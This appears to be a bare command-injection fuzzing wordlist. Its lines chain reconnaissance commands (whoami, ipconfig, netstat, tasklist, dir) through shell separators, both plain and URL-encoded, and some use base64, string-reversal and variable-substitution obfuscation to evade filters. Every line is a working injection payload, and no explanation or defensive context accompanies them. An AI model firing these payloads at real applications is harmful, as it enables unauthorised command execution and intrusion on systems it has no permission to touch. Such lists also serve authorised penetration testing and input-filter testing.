+tasklist&echo Pwned
+tasklist%26echo Pwned
+tasklist&&echo Pwned
+tasklist%26%26echo Pwned
+tasklist|echo Pwned
+tasklist%7cecho Pwned
+tasklist||echo Pwned
+tasklist%7c%7cecho Pwned
+tasklist`echo Pwned`
+tasklist%60%60echo Pwned
+tasklist$()echo Pwned
+tasklist%24%28%29echo Pwned
+echo${PATH:0:1}Windows${PATH:0:1}System32;tasklist
+echo${LS_COLORS:10:1}tasklist;tasklist
+$(tr '!-}' '"-~'<<<[);tasklist
+echo -n 'tasklist' | base64;tasklist
+cmd<<<$(base64 -d<<<dGFza2xpc3Q=);tasklist
+whoami&ipconfig
+whoami%26ipconfig
+whoami&&ipconfig
+whoami%26%26ipconfig
+whoami|ipconfig
+whoami%7cipconfig
+whoami||ipconfig
+whoami%7c%7cipconfig
+whoami`ipconfig`
+whoami%60%60ipconfig
+whoami$()ipconfig
+whoami%24%28%29ipconfig
+whoami^ipconfig
+"whoami"[-1..-20] -join ''&ipconfig
+"whoami"[-1..-20] -join ''|ipconfig
+iex "$('whoami'[-1..-20] -join '')"&ipconfig
+iex "$('whoami'[-1..-20] -join '')"|ipconfig
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))&ipconfig
+iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"&ipconfig
+ipconfig&echo Pwned
+ipconfig%26echo Pwned
+ipconfig&&echo Pwned
+ipconfig%26%26echo Pwned
+ipconfig|echo Pwned
+ipconfig%7cecho Pwned
+ipconfig||echo Pwned
+ipconfig%7c%7cecho Pwned
+ipconfig`echo Pwned`
+ipconfig%60%60echo Pwned
+ipconfig$()echo Pwned
+ipconfig%24%28%29echo Pwned
+echo${PATH:0:1}Windows${PATH:0:1}System32;ipconfig
+echo${LS_COLORS:10:1}ipconfig;ipconfig
+$(tr '!-}' '"-~'<<<[);ipconfig
+echo -n 'ipconfig' | base64;ipconfig
+cmd<<<$(base64 -d<<<aXBjb25maWc=);ipconfig
+whoami&netstat -an
+whoami%26netstat -an
+whoami&&netstat -an
+whoami%26%26netstat -an
+whoami|netstat -an
+whoami%7cnetstat -an
+whoami||netstat -an
+whoami%7c%7cnetstat -an
+whoami`netstat -an`
+whoami%60%60netstat -an
+whoami$()netstat -an
+whoami%24%28%29netstat -an
+whoami^netstat -an
+"whoami"[-1..-20] -join ''&netstat -an
+"whoami"[-1..-20] -join ''|netstat -an
+iex "$('whoami'[-1..-20] -join '')"&netstat -an
+iex "$('whoami'[-1..-20] -join '')"|netstat -an
+netstat -an&echo Pwned
+netstat -an%26echo Pwned
+netstat -an&&echo Pwned
+whoami&dir
+whoami%26dir
+whoami&&dir
+whoami%26%26dir
+whoami|dir
+whoami%7cdir
+whoami||dir
+whoami%7c%7cdir
+whoami`dir`
+whoami%60%60dir
+whoami$()dir
+whoami%24%28%29dir
+whoami^dir
+"whoami"[-1..-20] -join ''&dir
+"whoami"[-1..-20] -join ''|dir
+iex "$('whoami'[-1..-20] -join '')"&dir
+iex "$('whoami'[-1..-20] -join '')"|dir
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))&dir
+iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"&dir
+dir&echo Pwned
+dir%26echo Pwned
+dir&&echo Pwned
+dir%26%26echo Pwned
+dir|echo Pwned
+dir%7cecho Pwned
+dir||echo Pwned
+dir%7c%7cecho Pwned
